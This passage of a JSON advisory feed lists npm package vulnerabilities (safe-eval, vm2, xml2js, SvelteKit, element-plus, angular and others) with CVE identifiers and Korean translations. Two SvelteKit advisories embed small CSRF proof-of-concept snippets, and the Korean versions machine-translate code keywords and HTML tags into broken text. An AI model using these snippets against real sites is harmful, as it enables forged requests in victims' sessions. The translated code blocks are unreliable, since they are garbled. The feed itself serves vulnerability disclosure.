    "descriptionKR": "패키지 safe-eval의 모든 버전은 매개변수 내용의 부적절한 삭제로 인해 safeEval 기능을 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "All versions of the package safe-eval are vulnerable to Sandbox Bypass due to improper input sanitization. The vulnerability is derived from prototype pollution exploitation. Exploiting this vulnerability might result in remote code execution (RCE).\n\n**Vulnerable functions:**\n\n__defineGetter__, stack(), toLocaleString(), propertyIsEnumerable.call(),  valueOf().",
    "identifiers": "GHSA : GHSA-79xf-67r4-q2jj\nCVE : CVE-2023-26122",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-19T17:10:21Z",
    "publishedAt": "2023-04-11T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26122\nhttps://github.com/hacksparrow/safe-eval/issues/27\nhttps://github.com/hacksparrow/safe-eval/issues/31\nhttps://github.com/hacksparrow/safe-eval/issues/32\nhttps://github.com/hacksparrow/safe-eval/issues/33\nhttps://github.com/hacksparrow/safe-eval/issues/34\nhttps://github.com/hacksparrow/safe-eval/issues/35\nhttps://gist.github.com/seongil-wi/2db6cb884e10137a93132b7f74879cce\nhttps://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064\nhttps://github.com/advisories/GHSA-79xf-67r4-q2jj",
    "name": "safe-eval",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.2",
    "descriptionKR": "safe-eval 패키지의 모든 버전은 부적절한 입력 삭제로 인해 Sandbox Bypass에 취약합니다. 이 취약점은 프로토타입 오염 악용에서 파생됩니다. 이 취약점을 악용하면 RCE(원격 코드 실행)가 발생할 수 있습니다.\n\n**취약한 기능:**\n\n__defineGetter__, stack(), toLocaleString(), propertyIsEnumerable.call(), valueOf()."
  },
  {
    "description": "element-plus below 2.0.5 is vulnerable to Cross Site Scripting (XSS) when attribute `show-tooltips-overflow` of `el-table-column` is true. The mouseover action will make the text of this column render as html.",
    "identifiers": "GHSA : GHSA-rjvg-8v36-xv9r\nCVE : CVE-2022-27103",
    "severity": "MODERATE",
    "updatedAt": "2023-04-11T14:26:35Z",
    "publishedAt": "2022-04-26T00:00:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-27103\nhttps://github.com/asjdf/element-table-xss-test/issues/1\nhttps://github.com/element-plus/element-plus/issues/6514\nhttps://github.com/asjdf/element-table-xss-test/\nhttps://github.com/element-plus/element-plus/pull/6520\nhttps://github.com/element-plus/element-plus/commit/063c56446135176971f532bd0eb2e88a0b137d43\nhttps://github.com/advisories/GHSA-rjvg-8v36-xv9r",
    "name": "element-plus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.6",
    "identifier": "2.0.6",
    "descriptionKR": "2.0.5 미만의 element-plus는 `el-table-column`의 `show-tooltips-overflow` 속성이 true인 경우 XSS(Cross Site Scripting)에 취약합니다. 마우스 오버 동작은 이 열의 텍스트를 html로 렌더링합니다."
  },
  {
    "description": "xml2js versions before 0.5.0 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited.",
    "identifiers": "GHSA : GHSA-776f-qx25-q3cc\nCVE : CVE-2023-0842",
    "severity": "MODERATE",
    "updatedAt": "2023-06-21T18:11:17Z",
    "publishedAt": "2023-04-05T21:30:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-0842\nhttps://fluidattacks.com/advisories/myers/\nhttps://github.com/Leonidas-from-XIV/node-xml2js/issues/663\nhttps://github.com/Leonidas-from-XIV/node-xml2js/pull/603/commits/581b19a62d88f8a3c068b5a45f4542c2d6a495a5\nhttps://github.com/advisories/GHSA-776f-qx25-q3cc",
    "name": "xml2js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.0",
    "identifier": "0.5.0",
    "descriptionKR": "0.5.0 이전의 xml2js 버전에서는 외부 공격자가 개체에 새 속성을 편집하거나 추가할 수 있습니다. 이는 애플리케이션이 들어오는 JSON 키의 유효성을 제대로 검사하지 않아 `__proto__` 속성을 편집할 수 있기 때문에 가능합니다."
  },
  {
    "description": "An issue found in Directus API v.2.2.0 allows a remote attacker to cause a denial of service via a great amount of HTTP requests.",
    "identifiers": "GHSA : GHSA-3gvp-54v2-2jrp\nCVE : CVE-2020-19850",
    "severity": "MODERATE",
    "updatedAt": "2023-04-07T22:09:08Z",
    "publishedAt": "2023-04-04T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-19850\nhttps://github.com/directus/api/issues/982\nhttps://github.com/advisories/GHSA-3gvp-54v2-2jrp",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.2.0",
    "identifier": "2.2.1",
    "descriptionKR": "Directus API v.2.2.0에서 발견된 문제로 인해 원격 공격자가 대량의 HTTP 요청을 통해 서비스 거부를 유발할 수 있습니다."
  },
  {
    "description": "vm2 was not properly handling host objects passed to `Error.prepareStackTrace` in case of unhandled async errors.\n\n- vm2 version: ~3.9.14\n- Node version: 18.15.0, 19.8.1, 17.9.1\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.15` of `vm2`.\n\n### Workarounds\nNone.",
    "identifiers": "GHSA : GHSA-7jxr-cg7f-gpgv\nCVE : CVE-2023-29017",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-07T20:35:04Z",
    "publishedAt": "2023-04-07T20:35:03Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-7jxr-cg7f-gpgv\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29017\nhttps://github.com/patriksimek/vm2/issues/515\nhttps://github.com/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50\nhttps://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d\nhttps://github.com/advisories/GHSA-7jxr-cg7f-gpgv",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.15",
    "identifier": "3.9.15",
    "descriptionKR": "처리되지 않은 비동기 오류의 경우 vm2가 `Error.prepareStackTrace`에 전달된 호스트 개체를 제대로 처리하지 못했습니다.\n\n- vm2 버전: ~3.9.14\n- 노드 버전: 18.15.0, 19.8.1, 17.9.1\n\n### 영향\n공격자는 샌드박스 보호를 우회하여 샌드박스를 실행하는 호스트에서 원격 코드 실행 권한을 얻을 수 있습니다.\n\n### 패치\n이 취약점은 `vm2`의 `3.9.15` 버전 릴리스에서 패치되었습니다.\n\n### 해결 방법\n없음."
  },
  {
    "description": "### Summary\nThe SvelteKit framework offers developers an option to create simple REST APIs. This is done by defining a `+server.js` file, containing endpoint handlers for different HTTP methods.\n\nSvelteKit provides out-of-the-box cross-site request forgery (CSRF) protection to its users. The protection is implemented at `kit/src/runtime/server/respond.js`. While the implementation does a sufficient job of mitigating common CSRF attacks, the protection can be bypassed by simply specifying an upper-cased `Content-Type` header value. The browser will not send uppercase characters on form submission, but this check does not block all expected cross-site requests: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests\n\n### Details\nThe CSRF protection is implemented using the code shown below.\n\n``` javascript\n\t\tconst forbidden =\n\t\t\tis_form_content_type(request) &&\n\t\t\t(request.method === 'POST' ||\n\t\t\t\trequest.method === 'PUT' ||\n\t\t\t\trequest.method === 'PATCH' ||\n\t\t\t\trequest.method === 'DELETE') &&\n\t\t\trequest.headers.get('origin') !== url.origin;\n\n\t\tif (forbidden) {\n\t\t\tconst csrf_error = error(403, `Cross-site ${request.method} form submissions are forbidden`);\n\t\t\tif (request.headers.get('accept') === 'application/json') {\n\t\t\t\treturn json(csrf_error.body, { status: csrf_error.status });\n\t\t\t}\n\t\t\treturn text(csrf_error.body.message, { status: csrf_error.status });\n\t\t}\n```\n\nIf the incoming request specifies a POST/PUT/PATCH/DELETE method, the protection will compare the server’s origin with the value of the HTTP Origin header. A mismatch between these values signals that a potential attack has been detected. The final check is performed on the request’s `Content-Type` header whether the value is either `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`. If all the previous checks pass, the request will be rejected with an 403 error response.\nHowever, `is_form_content_type`, which is responsible for checking the value of the `Content-Type` header, is not sufficient to mitigate all possible variations of this type of attack. Since this function is checking `Content-Type` with lower-cased values, and the browser accepts upper-cased `Content-Type` header to be sent, a CSRF attack performed with the `Content-Type` header that contains an upper-cased character (e.g., `text/plaiN`) can circumvent the protection and the request will be processed by the endpoint handler.\n<!--\n### PoC\n1. Set up the SvelteKit with `POST /api/test` endpoint.\n2. Replace `REPLACE_DOMAIN` in the following HTML.\n``` html\n<script>\n(async() => {\n\tawait fetch(\"https://REPLACE_DOMAIN/api/test\", {method: \"POST\", headers:{\"Content-Type\":\"text/plaiN\"}, body: \"hello=world\"});\n})();\n</script>\n```\n3. Confirm that a POST request is processed by the server.\n-->\n### Impact\nIf abused, this issue will allow malicious requests to be submitted from third-party domains, which can allow execution of operations within the context of the victim's session, and in extreme scenarios can lead to unauthorized access to users’ accounts. This may lead to all POST operations requiring authentication being allowed in the following cases:\n1. If the target site sets `SameSite=None` on its auth cookie and the user visits a malicious site in a Chromium-based browser\n2. If the target site doesn't set the `SameSite` attribute explicitly and the user visits a malicious site with Firefox/Safari with tracking protections turned off.\n3. If the user is visiting a malicious site with a very outdated browser.\n\n### Remediations\nIt is preferred to update to SvelteKit 1.15.2. It is also recommended to explicitly set `SameSite` to a value other than `None` on authentication cookies especially if the upgrade cannot be done in a timely manner.",
    "identifiers": "GHSA : GHSA-gv7g-x59x-wf8f\nCVE : CVE-2023-29008",
    "severity": "HIGH",
    "updatedAt": "2023-04-14T20:30:48Z",
    "publishedAt": "2023-04-07T19:23:31Z",
    "references": "https://github.com/sveltejs/kit/security/advisories/GHSA-gv7g-x59x-wf8f\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29008\nhttps://github.com/sveltejs/kit/commit/ba436c6685e751d968a960fbda65f24cf7a82e9f\nhttps://github.com/advisories/GHSA-gv7g-x59x-wf8f",
    "name": "@sveltejs/kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.15.2",
    "identifier": "1.15.2",
    "descriptionKR": "### 요약\nSvelteKit 프레임워크는 개발자에게 간단한 REST API를 생성할 수 있는 옵션을 제공합니다. 이는 다양한 HTTP 메서드에 대한 끝점 처리기를 포함하는 `+server.js` 파일을 정의하여 수행됩니다.\n\nSvelteKit은 사용자에게 즉시 사용 가능한 CSRF(교차 사이트 요청 위조) 보호 기능을 제공합니다. 보호는 `kit/src/runtime/server/respond.js`에서 구현됩니다. 구현은 일반적인 CSRF 공격을 완화하는 데 충분한 작업을 수행하지만 단순히 대문자 'Content-Type' 헤더 값을 지정하여 보호를 우회할 수 있습니다. 브라우저는 양식 제출 시 대문자를 보내지 않지만 이 검사는 예상되는 모든 교차 사이트 요청을 차단하지 않습니다.\n\n### 세부 정보\nCSRF 보호는 아래 표시된 코드를 사용하여 구현됩니다.\n\n``` 자바스크립트\n금지된 상수 =\nis_form_content_type(요청) &&\n(request.method === 'POST' ||\nrequest.method === '넣기' ||\nrequest.method === '패치' ||\nrequest.method === '삭제') &&\nrequest.headers.get('origin') !== url.origin;\n\nif (금지) {\nconst csrf_error = 오류(403, `Cross-site ${request.method} 양식 제출은 금지됨`);\nif (request.headers.get('accept') === 'application/json') {\nreturn json(csrf_error.body, { 상태: csrf_error.status });\n}\n텍스트 반환(csrf_error.body.message, { 상태: csrf_error.status });\n}\n```\n\n들어오는 요청이 POST/PUT/PATCH/DELETE 메서드를 지정하는 경우 보호 기능은 서버의 원본을 HTTP 원본 헤더의 값과 비교합니다. 이러한 값 사이의 불일치는 잠재적인 공격이 감지되었음을 나타냅니다. 값이 `application/x-www-form-urlencoded`, `multipart/form-data` 또는 `text/plain`인지 요청의 `Content-Type` 헤더에서 최종 확인이 수행됩니다. 이전 검사를 모두 통과하면 403 오류 응답과 함께 요청이 거부됩니다.\n그러나 `Content-Type` 헤더의 값을 확인하는 역할을 하는 `is_form_content_type`은 이러한 유형의 공격에서 가능한 모든 변형을 완화하기에 충분하지 않습니다. 이 함수는 소문자 값으로 `Content-Type`을 확인하고 브라우저가 대문자 `Content-Type` 헤더를 전송하도록 허용하므로 대문자가 포함된 `Content-Type` 헤더로 CSRF 공격이 수행됩니다. 대소문자(예: `text/plaiN`)는 보호를 우회할 수 있으며 요청은 끝점 처리기에 의해 처리됩니다.\n<!--\n### PoC\n1. 'POST /api/test' 엔드포인트로 SvelteKit을 설정합니다.\n2. 다음 HTML에서 `REPLACE_DOMAIN`을 교체합니다.\n``` html\n<스크립트>\n(비동기() => {\nawait fetch(\"https://REPLACE_DOMAIN/api/test\", {method: \"POST\", headers:{\"Content-Type\":\"text/plaiN\"}, body: \"hello=world\"});\n})();\n</스크립트>\n```\n3. POST 요청이 서버에서 처리되는지 확인합니다.\n-->\n### 영향\n악용될 경우 이 문제로 인해 타사 도메인에서 악의적인 요청을 제출할 수 있으므로 피해자의 세션 컨텍스트 내에서 작업을 실행할 수 있으며 극단적인 시나리오에서는 사용자 계정에 대한 무단 액세스로 이어질 수 있습니다. 이로 인해 다음과 같은 경우 인증이 필요한 모든 POST 작업이 허용될 수 있습니다.\n1. 대상 사이트가 인증 쿠키에 'SameSite=None'을 설정하고 사용자가 Chromium 기반 브라우저에서 악성 사이트를 방문하는 경우\n2. 대상 사이트가 `SameSite` 속성을 명시적으로 설정하지 않고 사용자가 추적 방지 기능이 해제된 Firefox/Safari를 사용하여 악성 사이트를 방문하는 경우.\n3. 사용자가 매우 오래된 브라우저로 악성 사이트를 방문하는 경우.\n\n### 수정\nSvelteKit 1.15.2로 업데이트하는 것이 좋습니다. 또한 특히 업그레이드를 적시에 수행할 수 없는 경우 인증 쿠키에서 `SameSite`를 `None` 이외의 값으로 명시적으로 설정하는 것이 좋습니다."
  },
  {
    "description": "markdown-pdf version 11.0.0 allows an external attacker to remotely obtain arbitrary local files. This is possible because the application does not validate the Markdown content entered by the user.",
    "identifiers": "GHSA : GHSA-qghr-877h-f9jh\nCVE : CVE-2023-0835",
    "severity": "HIGH",
    "updatedAt": "2023-04-05T17:55:20Z",
    "publishedAt": "2023-04-05T00:30:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-0835\nhttps://fluidattacks.com/advisories/relsb/\nhttps://www.npmjs.com/package/markdown-pdf/\nhttps://github.com/advisories/GHSA-qghr-877h-f9jh",
    "name": "markdown-pdf",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 11.0.0",
    "descriptionKR": "markdown-pdf 버전 11.0.0을 사용하면 외부 공격자가 임의의 로컬 파일을 원격으로 얻을 수 있습니다. 이는 애플리케이션이 사용자가 입력한 Markdown 콘텐츠의 유효성을 검사하지 않기 때문에 가능합니다."
  },
  {
    "description": "Cross-site Scripting vulnerability found in Pandao Editor.md v.1.5.0 allows a remote attacker to execute arbitrary code via a crafted script to the `editor` parameter.",
    "identifiers": "GHSA : GHSA-5p84-mmh9-pxgr\nCVE : CVE-2020-19698",
    "severity": "MODERATE",
    "updatedAt": "2023-04-07T22:35:12Z",
    "publishedAt": "2023-04-04T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-19698\nhttps://github.com/pandao/editor.md/issues/700\nhttps://github.com/pandao/editor.md/pull/860\nhttps://github.com/advisories/GHSA-5p84-mmh9-pxgr",
    "name": "editor.md",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.5.0",
    "descriptionKR": "Pandao Editor.md v.1.5.0에서 발견된 사이트 간 스크립팅 취약점으로 인해 원격 공격자가 'editor' 매개변수에 대해 조작된 스크립트를 통해 임의 코드를 실행할 수 있습니다."
  },
  {
    "description": "Cross-site Scripting vulnerability found in Pandao Editor.md v.1.5.0 allows a remote attacker to execute arbitrary code via a crafted script in the `<iframe> src` parameter.",
    "identifiers": "GHSA : GHSA-w974-rq9x-mh3v\nCVE : CVE-2020-19697",
    "severity": "MODERATE",
    "updatedAt": "2023-04-07T22:43:27Z",
    "publishedAt": "2023-04-04T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-19697\nhttps://github.com/pandao/editor.md/issues/701\nhttps://github.com/pandao/editor.md/pull/860\nhttps://github.com/advisories/GHSA-w974-rq9x-mh3v",
    "name": "editor.md",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.5.0",
    "descriptionKR": "Pandao Editor.md v.1.5.0에서 발견된 교차 사이트 스크립팅 취약점으로 인해 원격 공격자가 `<iframe> src` 매개변수의 조작된 스크립트를 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "### Summary\nThe SvelteKit framework offers developers an option to create simple REST APIs. This is done by defining a `+server.js` file, containing endpoint handlers for different HTTP methods.\n\nSvelteKit provides out-of-the-box cross-site request forgery (CSRF) protection to it’s users. The protection is implemented at `kit/src/runtime/server/respond.js#L52`. While the implementation does a sufficient job in mitigating common CSRF attacks, the protection can be bypassed by simply specifying a different `Content-Type` header value.\n\n### Details\nThe CSRF protection is implemented using the code shown below.\n\n```js\nconst forbidden =\n  // (1)\n  request.method === 'POST' &&\n  // (2)\n  request.headers.get('origin') !== url.origin &&\n  // (3)\n  is_form_content_type(request);\n\nif (forbidden) {\n  // (4)\n  const csrf_error = error(403, `Cross-site ${request.method} form submissions are forbidden`);\n  if (request.headers.get('accept') === 'application/json') {\n    return json(csrf_error.body, { status: csrf_error.status });\n  }\n  return text(csrf_error.body.message, { status: csrf_error.status });\n}\n```\nIf the incoming request specifies a POST method (1), the protection will compare the server’s origin with the value of the HTTP `Origin` header (2). A mismatch between these values signals that a potential attack has been detected. The final check is performed on the request’s `Content-Type` header (3) whether the value is either `application/x-www-form-urlencoded` or `multipart/form-data` (`kit/src/utils/http.js#L71`). If all the previous checks pass, the request will be rejected with an 403 error response (4).\n\nThe `is_form_content_type` validation is not sufficient to mitigate all possible variations of this type of attack. If a CSRF attack is performed with the `Content-Type` header set to `text/plain`, the protection will be circumvented and the request will be processed by the endpoint handler.\n<!--\n### PoC\nTo reproduce this issue, create and run a simple server (by default running on `localhost:3000`) with a POST endpoint handler such as:\n\n```js\nexport async function POST({ request }) {\n    const data = await request.json(); \n    console.log(JSON.stringify(data));\n    return new Response(String('success'));\n}\n```\n\nNext, save the malicious HTML page:\n\n```html\n<!DOCTYPE html>\n<html>\n<head></head>\n<body>\n  <h1 id=\"name\"></h1>\n  <form action=\"http://localhost:3000/api/test\" method=\"POST\" enctype=\"text/plain\">\n    <input type=\"hidden\" name=\"&#123;&quot;name&quot;&#58;&quot;test\" value=\"&quot;&#44;&quot;age&quot;&#58;123&#125;\" />\n    <input type=\"submit\" value=\"Submit\" />\n  </form>\n</body>\n</html>\n```\n\nin a file named `index.html`. Run another web server, using Python’s built in http.server module (`python -m http.server`, by default running on `localhost:8000`), navigate to [http://localhost:8000/index.html](http://localhost:8000/index.html) and click the `Submit` button. \n\nVerify that the browser’s URL has changed to `localhost:3000` and that the text `success` is displayed on the screen. Additionally, inspect the console of the SvelteKit web server and verify that the request body (`{\"name\":\"test=\",\"age\":123}`) was parsed as valid JSON and printed out. \n\nIt's worth noting that this attack is possible only for JSON request bodies. Form data sent using `text/plain` will be rejected by the server. \n-->\n### Impact\n\nIf abused, this issue will allow malicious requests to be submitted from third-party domains, which can allow execution of operations within the context of the victim's session, and in extreme scenarios can lead to unauthorized access to users’ accounts.\n\n### Remediation\n\nSvelteKit 1.15.1 updates the `is_form_content_type` function call in the CSRF protection logic to include `text/plain`.\n\nAs additional hardening of the CSRF protection mechanism against potential method overrides, SvelteKit 1.15.1 is now performing validation on PUT, PATCH and DELETE methods as well. This latter hardening is only needed to protect users who have put in some sort of `?_method=` override feature themselves in their `handle` hook, so that the request that `resolve` sees could be `PUT`/`PATCH`/`DELETE` when the browser issues a `POST` request.",
    "identifiers": "GHSA : GHSA-5p75-vc5g-8rv2\nCVE : CVE-2023-29003",
    "severity": "HIGH",
    "updatedAt": "2023-04-06T22:52:28Z",
    "publishedAt": "2023-04-04T21:20:47Z",
    "references": "https://github.com/sveltejs/kit/security/advisories/GHSA-5p75-vc5g-8rv2\nhttps://github.com/sveltejs/kit/commit/bb2253d51d00aba2e4353952d4fb0dcde6c77123\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29003\nhttps://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%401.15.1\nhttps://github.com/advisories/GHSA-5p75-vc5g-8rv2",
    "name": "@sveltejs/kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.15.1",
    "identifier": "1.15.1",
    "descriptionKR": "### 요약\nSvelteKit 프레임워크는 개발자에게 간단한 REST API를 생성할 수 있는 옵션을 제공합니다. 이는 다양한 HTTP 메서드에 대한 끝점 처리기를 포함하는 `+server.js` 파일을 정의하여 수행됩니다.\n\nSvelteKit은 사용자에게 즉시 사용 가능한 CSRF(교차 사이트 요청 위조) 보호 기능을 제공합니다. 보호는 `kit/src/runtime/server/respond.js#L52`에서 구현됩니다. 구현은 일반적인 CSRF 공격을 완화하는 데 충분한 작업을 수행하지만 단순히 다른 'Content-Type' 헤더 값을 지정하여 보호를 우회할 수 있습니다.\n\n### 세부 정보\nCSRF 보호는 아래 표시된 코드를 사용하여 구현됩니다.\n\n```js\n금지된 상수 =\n  // (1)\n  request.method === 'POST' &&\n  // (2)\n  request.headers.get('origin') !== url.origin &&\n  // (삼)\n  is_form_content_type(요청);\n\nif (금지) {\n  // (4)\n  const csrf_error = 오류(403, `Cross-site ${request.method} 양식 제출은 금지됨`);\n  if (request.headers.get('accept') === 'application/json') {\n    return json(csrf_error.body, { 상태: csrf_error.status });\n  }\n  텍스트 반환(csrf_error.body.message, { 상태: csrf_error.status });\n}\n```\n들어오는 요청이 POST 메서드(1)를 지정하는 경우 보호는 서버의 출처를 HTTP `Origin` 헤더의 값(2)과 비교합니다. 이러한 값 사이의 불일치는 잠재적인 공격이 감지되었음을 나타냅니다. 요청의 `Content-Type` 헤더(3)에서 값이 `application/x-www-form-urlencoded` 또는 `multipart/form-data`(`kit/src/utils/http .js#L71`). 이전 검사를 모두 통과하면 403 오류 응답(4)과 함께 요청이 거부됩니다.\n\n`is_form_content_type` 유효성 검사는 이러한 유형의 공격에서 가능한 모든 변형을 완화하기에 충분하지 않습니다. 'Content-Type' 헤더가 'text/plain'으로 설정된 상태에서 CSRF 공격이 수행되면 보호가 우회되고 요청이 엔드포인트 핸들러에 의해 처리됩니다.\n<!--\n### PoC\n이 문제를 재현하려면 다음과 같은 POST 끝점 처리기를 사용하여 간단한 서버(기본적으로 `localhost:3000`에서 실행)를 만들고 실행합니다.\n\n```js\n비동기 함수 내보내기 POST({ 요청 }) {\n    const 데이터 = await request.json();\n    console.log(JSON.stringify(data));\n    return new Response(String('성공'));\n}\n```\n\n다음으로 악성 HTML 페이지를 저장합니다.\n\n```html\n<!DOCTYPE html>\n<html>\n<헤드></헤드>\n<몸>\n  <h1 id=\"이름\"></h1>\n  <form action=\"http://localhost:3000/api/test\" method=\"POST\" enctype=\"text/plain\">\n    <input type=\"hidden\" name=\"{\"name\":\"test\" value=\"\",\"age\":123}\" />\n    <입력 유형=\"제출\" 값=\"제출\" />\n  </form>\n</body>\n</html>\n```\n\n`index.html`이라는 파일에서. Python의 내장 http.server 모듈(`python -m http.server`, 기본적으로 `localhost:8000`에서 실행)을 사용하여 다른 웹 서버를 실행하고 [http://localhost:8000/index.html]( http://localhost:8000/index.html) '제출' 버튼을 클릭합니다.\n\n브라우저의 URL이 `localhost:3000`으로 변경되고 화면에 `success`라는 텍스트가 표시되는지 확인합니다. 또한 SvelteKit 웹 서버의 콘솔을 검사하고 요청 본문(`{\"name\":\"test=\",\"age\":123}`)이 유효한 JSON으로 구문 분석되어 출력되었는지 확인합니다.\n\n이 공격은 JSON 요청 본문에 대해서만 가능하다는 점은 주목할 가치가 있습니다. `text/plain`을 사용하여 전송된 양식 데이터는 서버에서 거부됩니다.\n-->\n### 영향\n\n악용될 경우 이 문제로 인해 타사 도메인에서 악의적인 요청을 제출할 수 있으므로 피해자의 세션 컨텍스트 내에서 작업을 실행할 수 있으며 극단적인 시나리오에서는 사용자 계정에 대한 무단 액세스로 이어질 수 있습니다.\n\n### 교정\n\nSvelteKit 1.15.1은 'text/plain'을 포함하도록 CSRF 보호 로직의 'is_form_content_type' 함수 호출을 업데이트합니다.\n\n잠재적인 메서드 재정의에 대한 CSRF 보호 메커니즘의 추가 강화로 SvelteKit 1.15.1은 이제 PUT, PATCH 및 DELETE 메서드에 대한 유효성 검사도 수행합니다. 후자의 강화는 일종의 `?_method=` 재정의 기능을 `handle` 후크에 넣은 사용자를 보호하기 위해서만 필요하므로 `resolve`가 보는 요청은 `PUT`/`PATCH`/가 될 수 있습니다. 브라우저가 `POST` 요청을 발행할 때 `DELETE`."
  },
  {
    "description": "Affected versions of `tough-cookie` are susceptible to a regular expression denial of service.\n\nThe amplification on this vulnerability is relatively low - it takes around 2 seconds for the engine to execute on a malicious input which is 50,000 characters in length.\n\nIf node was compiled using the `-DHTTP_MAX_HEADER_SIZE` however, the impact of the vulnerability can be significant, as the primary limitation for the vulnerability is the default max HTTP header length in node.\n\n\n## Recommendation\n\nUpdate to version 2.3.3 or later.",
    "identifiers": "GHSA : GHSA-g7q5-pjjr-gqvp\nCVE : CVE-2017-15010",
    "severity": "HIGH",
    "updatedAt": "2023-04-03T18:14:18Z",
    "publishedAt": "2018-07-24T20:14:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-15010\nhttps://github.com/salesforce/tough-cookie/issues/92\nhttps://github.com/advisories/GHSA-g7q5-pjjr-gqvp\nhttps://www.npmjs.com/advisories/525\nhttps://access.redhat.com/errata/RHSA-2017:2912\nhttps://access.redhat.com/errata/RHSA-2017:2913\nhttps://access.redhat.com/errata/RHSA-2018:1263\nhttps://access.redhat.com/errata/RHSA-2018:1264\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6VEBDTGNHVM677SLZDEHMWOP3ISMZSFT/\nhttps://snyk.io/vuln/npm:tough-cookie:20170905\nhttp://www.securityfocus.com/bid/101185\nhttps://github.com/salesforce/tough-cookie/commit/f1ed420a6a92ea7a5418df6e39e676556bc0c71d",
    "name": "tough-cookie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.3.3",
    "identifier": "2.3.3",
    "descriptionKR": "영향을 받는 'tough-cookie' 버전은 정규식 서비스 거부에 취약합니다.\n\n이 취약점에 대한 증폭은 상대적으로 낮습니다. 엔진이 50,000자 길이의 악성 입력을 실행하는 데 약 2초가 걸립니다.\n\n그러나 `-DHTTP_MAX_HEADER_SIZE`를 사용하여 노드를 컴파일한 경우 취약점의 주요 제한 사항은 노드의 기본 최대 HTTP 헤더 길이이므로 취약점의 영향이 클 수 있습니다.\n\n\n## 추천\n\n버전 2.3.3 이상으로 업데이트하십시오."
  },
  {
    "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the angular.copy() utility function due to the usage of an insecure regular expression. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking.",
    "identifiers": "GHSA : GHSA-2vrf-hf26-jrp5\nCVE : CVE-2023-26116",
    "severity": "MODERATE",
    "updatedAt": "2023-05-22T21:31:00Z",
    "publishedAt": "2023-03-30T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26116\nhttps://security.snyk.io/vuln/SNYK-JS-ANGULAR-3373044\nhttps://stackblitz.com/edit/angularjs-vulnerability-angular-copy-redos\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-5406320\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBANGULAR-5406322\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5406321\nhttps://github.com/advisories/GHSA-2vrf-hf26-jrp5",
    "name": "angular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.3",
    "descriptionKR": "모든 버전의 angular 패키지는 안전하지 않은 정규식 사용으로 인해 angular.copy() 유틸리티 함수를 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 신중하게 제작된 입력을 통해 이 취약성을 악용할 수 있으며, 이로 인해 치명적인 역추적이 발생할 수 있습니다."
  },
  {
    "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the $resource service due to the usage of an insecure regular expression. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking.",
    "identifiers": "GHSA : GHSA-2qqx-w9hr-q5gx\nCVE : CVE-2023-26117",
    "severity": "MODERATE",
    "updatedAt": "2023-05-22T21:31:01Z",
    "publishedAt": "2023-03-30T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26117\nhttps://security.snyk.io/vuln/SNYK-JS-ANGULAR-3373045\nhttps://stackblitz.com/edit/angularjs-vulnerability-resource-trailing-slashes-redos\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-5406323\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBANGULAR-5406325\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5406324\nhttps://github.com/advisories/GHSA-2qqx-w9hr-q5gx",
    "name": "angular",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.3",
